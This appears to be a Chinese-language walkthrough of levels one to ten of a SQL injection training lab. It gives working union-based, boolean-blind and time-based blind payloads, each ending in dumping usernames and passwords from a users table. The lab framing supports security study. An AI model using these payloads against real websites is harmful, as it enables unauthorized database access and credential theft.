### 简介
mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。\
tables这个表的table_name字段下面是所有数据库存在的表名。\
table_schema字段下是所有表名对应的数据库名。\
columns这个表的colum_name字段下是所有数据库存在的字段名。\
columns_schema字段下是所有表名对应的数据库
### 实战
#### 第一题
1. 判断是否存在sql注入
提示你输入数字值的ID作为参数，我们输入?id=1\
通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了\
接下来我们判断sql语句是否是拼接，且是字符型还是数字型\
可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询原理简单说一下，联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的\
2. 联合注入
首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数\
~~~
?id=1'order by 3 --+
~~~
爆出显示位，就是看看表格里面那一列是在页面显示的。可以看到是第二列和第三列里面的数据是显示在页面的\
~~~
?id=-1'union select 1,2,3--+
~~~
获取当前数据名和版本号\
~~~
?id=-1'union select 1,database(),version()--+
~~~
information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。也就是下面表格user和passwd\
~~~
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
~~~
爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容\
该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。\
~~~
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
~~~
通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容\
~~~
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
~~~
#### 第二题
和第一关是一样进行判断，当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有我们可以猜测sql语句应该是数字型注入。那步骤和我们第一关是差不多的
~~~
"SELECT * FROM users WHERE id=$id LIMIT 0,1"
"SELECT * FROM users WHERE id=1 ' LIMIT 0,1"出错信息。
 
 
?id=1 order by 3
?id=-1 union select 1,2,3
?id=-1 union select 1,database(),version()
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
?id=-1 union select 1,2,group_concat(username ,id , password) from users
~~~
#### 第三题
当我们在输入?id=2'的时候看到页面报错信息。可推断sql语句是单引号字符型且有括号，所以我们需要闭合单引号且也要考虑括号。\
~~~
?id=2')--+
?id=1') order by 3--+
?id=-1') union select 1,2,3--+
?id=-1') union select 1,database(),version()--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
~~~
#### 第四题
根据页面报错信息得知sql语句是双引号字符型且有括号，通过以下代码进行sql注入
~~~
?id=1") order by 3--+
?id=-1") union select 1,2,3--+
?id=-1") union select 1,database(),version()--+
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
~~~
#### 第五题
第五关根据页面结果得知是字符型但是和前面四关还是不一样是因为页面虽然有东西。但是只有对于请求对错出现不一样页面其余的就没有了。这个时候我们用联合注入就没有用，因为联合注入是需要页面有回显位。如果数据 不显示只有对错页面显示我们可以选择布尔盲注。布尔盲注主要用到length(),ascii() ,substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说需要花费大量时间。
~~~
?id=1'and length((select database()))>9--+
#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
?id=1'and ascii(substr((select database()),1,1))=115--+
#substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
 
?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
判断所有表名字符长度。
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
逐一判断表名
 
?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
判断所有字段名的长度
?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
逐一判断字段名。
?id=1' and length((select group_concat(username,password) from users))>109--+
判断字段内容长度
?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
逐一检测内容。
~~~
#### 第六题
第六关和第五关是差不多的，根据页面报错信息可以猜测id参数是双引号，只需将第五关的单引号换成双引号就可以了。
#### 第七题
第七关当在输入id=1,页面显示you are in... 当我们输入id=1'时显示报错，但是没有报错信息，这和我们之前的关卡不一样，之前都有报错信息。当我们输入id=1"时显示正常所以我们可以断定参数id时单引号字符串。因为单引号破坏了他原有语法结构。然后我输入id=1'--+时报错，这时候我们可以输入id=1')--+发现依然报错，之时我试试是不是双括号输入id=1'))--+，发现页面显示正常。那么它的过关手法和前面就一样了选择布尔盲注就可以了。
#### 第八题
第八关和第五关一样就不多说了。只不过第八关没有报错信息，但是有you are in..进行参照。id参数是一个单引号字符串。
#### 第九题
第九关会发现我们不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用，布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。
~~~
?id=1' and if(1=1,sleep(5),1)--+
判断参数构造。
?id=1'and if(length((select database()))>9,sleep(5),1)--+
判断数据库名长度
 
?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
逐一判断数据库字符
?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
判断所有表名长度

?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
逐一判断表名
?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
判断所有字段名的长度
 
?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
逐一判断字段名。
?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
判断字段内容长度
 
?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
逐一检测内容。
~~~
#### 第十题
第十关和第九关一样只需要将单引号换成双引号。
